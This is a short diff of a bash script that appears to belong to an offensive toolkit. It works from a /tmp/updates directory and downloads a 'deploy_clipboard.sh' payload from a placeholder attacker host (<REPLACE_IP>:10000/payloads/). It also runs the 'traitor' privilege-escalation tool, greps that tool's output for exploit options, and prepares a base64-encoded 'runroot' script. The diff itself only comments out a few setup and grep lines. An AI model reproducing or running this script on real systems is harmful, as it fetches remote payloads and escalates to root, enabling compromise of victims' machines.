@@ -1,7 +1,7 @@
 #!/bin/bash
 dir1=/tmp/updates
-rm -rf $dir1
-mkdir /tmp/updates
+# rm -rf $dir1
+# mkdir /tmp/updates
 cd $dir1
 
 runroot={RUNROOT_BASE64}
@@ -25,7 +25,7 @@ wget http://<REPLACE_IP>:10000/payloads/deploy_clipboard.sh -O ./deploy_clipboar
 # wget https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-386 -O ./traitor
 chmod +x traitor
 ./traitor > traitor_out.txt
-cat traitor_out.txt | grep -oE '\-\-exploit \w+(:)\w+' > GTFO.txt 
+# cat traitor_out.txt | grep -oE '\-\-exploit \w+(:)\w+' > GTFO.txt 
 chmod +x ./runroot.sh
 
 
